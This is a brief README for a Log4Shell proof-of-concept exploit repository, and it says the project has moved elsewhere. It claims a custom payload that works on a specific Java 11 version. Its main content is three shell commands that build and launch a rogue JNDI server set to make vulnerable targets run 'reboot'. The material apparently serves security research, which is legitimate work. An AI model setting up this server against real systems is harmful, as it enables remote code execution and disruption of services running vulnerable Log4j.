# log4shell-poc 

MOVED HERE - https://github.com/chains-project/exploits-for-sbom.exe

## How we are different
1. We provide a custom payload
2. Found no other documentation of it only working for specific Java 11

## To start JNDI server
```shell
cd rogue-jndi
mvn clean package -DskipTests
java -jar target/RogueJndi-1.1.jar --command reboot
```
